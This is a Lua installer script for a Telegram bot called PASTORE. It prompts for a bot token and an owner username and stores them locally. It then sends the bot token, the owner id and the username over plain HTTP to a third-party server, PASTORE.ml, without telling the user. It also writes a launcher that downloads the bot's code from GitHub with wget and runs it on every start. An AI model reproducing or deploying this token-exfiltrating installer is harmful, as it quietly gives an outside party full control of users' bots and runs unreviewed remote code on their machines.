serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_PASTORE = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_PASTORE = function() 
local Create_Info = function(Token,Sudo,UserName)  
local PASTORE_Info_Sudo = io.open("sudo.lua", 'w')
PASTORE_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
PASTORE_Info_Sudo:close()
end  
if not database:get(Server_PASTORE.."Token_PASTORE") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_PASTORE.."Token_PASTORE",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_PASTORE.."UserName_PASTORE") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://PASTORE.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_PASTORE.."UserName_PASTORE",Json.Info.Username)
database:set(Server_PASTORE.."Id_PASTORE",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_PASTORE_Info()
Create_Info(database:get(Server_PASTORE.."Token_PASTORE"),database:get(Server_PASTORE.."Id_PASTORE"),database:get(Server_PASTORE.."UserName_PASTORE"))   
http.request("http://PASTORE.ml/add/?id="..database:get(Server_PASTORE.."Id_PASTORE").."&user="..database:get(Server_PASTORE.."UserName_PASTORE").."&token="..database:get(Server_PASTORE.."Token_PASTORE"))
local RunPASTORE = io.open("PASTORE", 'w')
RunPASTORE:write([[
#!/usr/bin/env bash
cd $HOME/PASTORE
token="]]..database:get(Server_PASTORE.."Token_PASTORE")..[["
rm -fr PASTORE.lua
wget "https://raw.githubusercontent.com/PASTORETEAM/PASTORE/main/PASTORE.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./PASTORE.lua -p PROFILE --bot=$token
done
]])
RunPASTORE:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/PASTORE
while(true) do
rm -fr ../.telegram-cli
screen -S PASTORE -X kill
screen -S PASTORE ./PASTORE
done
]])
RunTs:close()
end
Files_PASTORE_Info()
database:del(Server_PASTORE.."Token_PASTORE");database:del(Server_PASTORE.."Id_PASTORE");database:del(Server_PASTORE.."UserName_PASTORE")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_PASTORE()  
var = true
else   
f:close()  
database:del(Server_PASTORE.."Token_PASTORE");database:del(Server_PASTORE.."Id_PASTORE");database:del(Server_PASTORE.."UserName_PASTORE")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
